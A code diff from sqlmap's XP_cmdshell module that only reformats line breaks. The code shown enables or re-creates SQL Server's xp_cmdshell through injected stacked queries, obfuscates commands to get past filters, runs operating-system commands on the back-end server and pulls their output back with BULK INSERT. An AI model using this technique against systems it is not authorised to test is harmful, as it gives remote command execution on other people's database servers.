@@ -33,6 +33,7 @@ from lib.core.exception import SqlmapUnsupportedFeatureException
 from lib.core.threads import getCurrentThreadData
 from lib.request import inject
 
+
 class XP_cmdshell:
     """
     This class defines methods to deal with Microsoft SQL Server
@@ -54,7 +55,10 @@ class XP_cmdshell:
         self._randStr = randomStr(lowercase=True)
         self.xpCmdshellStr = "master..new_xp_cmdshell"
 
-        cmd = getSQLSnippet(DBMS.MSSQL, "create_new_xp_cmdshell", RANDSTR=self._randStr)
+        cmd = getSQLSnippet(
+            DBMS.MSSQL,
+            "create_new_xp_cmdshell",
+            RANDSTR=self._randStr)
 
         if not Backend.isVersionWithin(("2000",)):
             cmd += ";RECONFIGURE WITH OVERRIDE"
@@ -66,7 +70,10 @@ class XP_cmdshell:
         debugMsg += "stored procedure"
         logger.debug(debugMsg)
 
-        cmd = getSQLSnippet(DBMS.MSSQL, "configure_xp_cmdshell", ENABLE=str(mode))
+        cmd = getSQLSnippet(
+            DBMS.MSSQL,
+            "configure_xp_cmdshell",
+            ENABLE=str(mode))
 
         return cmd
 
@@ -76,9 +83,15 @@ class XP_cmdshell:
         logger.debug(debugMsg)
 
         if mode == 1:
-            cmd = getSQLSnippet(DBMS.MSSQL, "enable_xp_cmdshell_2000", ENABLE=str(mode))
+            cmd = getSQLSnippet(
+                DBMS.MSSQL,
+                "enable_xp_cmdshell_2000",
+                ENABLE=str(mode))
         else:
-            cmd = getSQLSnippet(DBMS.MSSQL, "disable_xp_cmdshell_2000", ENABLE=str(mode))
+            cmd = getSQLSnippet(
+                DBMS.MSSQL,
+                "disable_xp_cmdshell_2000",
+                ENABLE=str(mode))
 
         return cmd
 
@@ -107,7 +120,8 @@ class XP_cmdshell:
         if output == "1":
             logger.info("xp_cmdshell extended procedure is usable")
         elif isNoneValue(output) and conf.dbmsCred:
-            errMsg = "it seems that the temporary directory ('%s') used for " % self.getRemoteTempPath()
+            errMsg = "it seems that the temporary directory ('%s') used for " % self.getRemoteTempPath(
+            )
             errMsg += "storing console output within the back-end file system "
             errMsg += "does not have writing permissions for the DBMS process. "
             errMsg += "You are advised to manually adjust it with option "
@@ -157,7 +171,8 @@ class XP_cmdshell:
         # NOTE: this does not need to be done when the command is 'del' to
         # delete the temporary file
         if conf.dbmsCred and insertIntoTable:
-            self.tmpFile = "%s/tmpc%s.txt" % (conf.tmpPath, randomStr(lowercase=True))
+            self.tmpFile = "%s/tmpc%s.txt" % (conf.tmpPath,
+                                              randomStr(lowercase=True))
             cmd = "%s > \"%s\"" % (cmd, self.tmpFile)
 
         # Obfuscate the command to execute, also useful to bypass filters
@@ -206,32 +221,54 @@ class XP_cmdshell:
             # The file needs to be copied to the support table,
             # 'sqlmapoutput'
             if conf.dbmsCred:
-                inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (self.cmdTblName, self.tmpFile, randomStr(10), randomStr(10)))
+                inject.goStacked(
+                    "BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" %
+                    (self.cmdTblName, self.tmpFile, randomStr(10), randomStr(10)))
                 self.delRemoteFile(self.tmpFile)
 
-            query = "SELECT %s FROM %s ORDER BY id" % (self.tblField, self.cmdTblName)
+            query = "SELECT %s FROM %s ORDER BY id" % (
+                self.tblField, self.cmdTblName)
 
-            if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:
-                output = inject.getValue(query, resumeValue=False, blind=False, time=False)
+            if any(
+                isTechniqueAvailable(_) for _ in (
+                    PAYLOAD.TECHNIQUE.UNION,
+                    PAYLOAD.TECHNIQUE.ERROR,
+                    PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:
+                output = inject.getValue(
+                    query, resumeValue=False, blind=False, time=False)
 
-            if (output is None) or len(output)==0 or output[0] is None:
+            if (output is None) or len(output) == 0 or output[0] is None:
                 output = []
-                count = inject.getValue("SELECT COUNT(id) FROM %s" % self.cmdTblName, resumeValue=False, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
+                count = inject.getValue(
+                    "SELECT COUNT(id) FROM %s" %
+                    self.cmdTblName,
+                    resumeValue=False,
+                    union=False,
+                    error=False,
+                    expected=EXPECTED.INT,
+                    charsetType=CHARSET_TYPE.DIGITS)
 
                 if isNumPosStrValue(count):
                     for index in getLimitRange(count):
                         query = agent.limitQuery(index, query, self.tblField)
-                        output.append(inject.getValue(query, union=False, error=False, resumeValue=False))
+                        output.append(
+                            inject.getValue(
+                                query,
+                                union=False,
+                                error=False,
+                                resumeValue=False))
 
             inject.goStacked("DELETE FROM %s" % self.cmdTblName)
 
             if output and isListLike(output) and len(output) > 1:
                 _ = ""
-                lines = [line for line in flattenValue(output) if line is not None]
+                lines = [line for line in flattenValue(
+                    output) if line is not None]
 
                 for i in xrange(len(lines)):
                     line = lines[i] or ""
-                    if line is None or i in (0, len(lines) - 1) and not line.strip():
+                    if line is None or i in (
+                            0, len(lines) - 1) and not line.strip():
                         continue
                     _ += "%s\n" % line
 
@@ -279,7 +316,9 @@ class XP_cmdshell:
                             warnMsg += "because sp_OACreate is disabled"
                             logger.warn(warnMsg)
 
-            hashDBWrite(HASHDB_KEYS.KB_XP_CMDSHELL_AVAILABLE, kb.xpCmdshellAvailable)
+            hashDBWrite(
+                HASHDB_KEYS.KB_XP_CMDSHELL_AVAILABLE,
+                kb.xpCmdshellAvailable)
 
             if not kb.xpCmdshellAvailable:
                 errMsg = "unable to proceed without xp_cmdshell"
